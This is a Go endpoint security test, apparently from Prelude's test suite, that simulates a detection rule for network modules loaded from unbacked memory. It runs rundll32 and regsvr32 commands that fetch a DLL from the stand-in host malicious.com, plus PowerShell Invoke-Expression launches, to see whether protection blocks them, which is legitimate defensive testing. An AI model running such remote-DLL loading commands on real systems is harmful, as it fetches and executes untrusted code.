//go:build windows
// +build windows

/*
ID: aa265fbd-4c57-46ff-9e89-0635101cc50d
NAME: Network Module Loaded from Suspicious Unbacked Memory
CREATED: 2024-07-01
scenario: load of network module by process where creating thread's stack contains frames pointing outside known executable image
evasion via process injection
*/
package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"

	Endpoint "github.com/preludeorg/test/endpoint"
)

func main() {
	Endpoint.Say("[+] Starting Network Module Loaded from Suspicious Unbacked Memory VST")
	Endpoint.Start(test, cleanup)
}

func test() {
	executeCommand := func(command string) {
		if !Endpoint.IsAvailable("cmd.exe") {
			Endpoint.Say("[+] Command execution is not available")
			Endpoint.Stop(126) // PROTECTED: Access Denied
		}

		out, err := exec.Command("cmd.exe", "/C", command).CombinedOutput()
		if err != nil {
			Endpoint.Say(fmt.Sprintf("[-] Failed to execute command: %s", string(out)))
			Endpoint.Stop(1) // ERROR
		}

		Endpoint.Say(fmt.Sprintf("[+] Successfully executed command: %s", command))

		if strings.Contains(string(out), "Access Denied") {
			Endpoint.Say("[+] Process execution was blocked")
			Endpoint.Stop(126) // PROTECTED: Access Denied
		}
	}

	// Simulating process execution with conditions specified in the rule
	commands := []string{
		"powershell.exe -Command Invoke-Expression -Command {Start-Process rundll32.exe -ArgumentList 'shell32.dll,Control_RunDLL'}",
		"powershell.exe -Command Invoke-Expression -Command {Start-Process regsvr32.exe -ArgumentList '/s /u shell32.dll'}",
	}

	for _, command := range commands {
		executeCommand(command)
	}

	// Simulate DLL loading from suspicious unbacked memory
	dllLoadingCommands := []string{
		"rundll32.exe shell32.dll,ShellExec_RunDLL http://malicious.com/malicious.dll",
		"regsvr32.exe /s /u http://malicious.com/malicious.dll",
	}

	for _, command := range dllLoadingCommands {
		executeCommand(command)
	}

	// Simulate exclusion conditions
	exclusionCommands := []string{
		"powershell.exe -Command Invoke-Expression -Command {Start-Process rundll32.exe -ArgumentList '--enable-speech-input --enable-media-stream --no-sandbox'}",
		"powershell.exe -Command Invoke-Expression -Command {Start-Process regsvr32.exe -ArgumentList '--no-sandbox'}",
	}

	for _, command := range exclusionCommands {
		executeCommand(command)
	}

	Endpoint.Stop(101) // UNPROTECTED
}

func cleanup() {
	// No specific cleanup actions required for this VST
	Endpoint.Say("[+] Cleanup completed successfully")
	Endpoint.Stop(100) // PROTECTED
}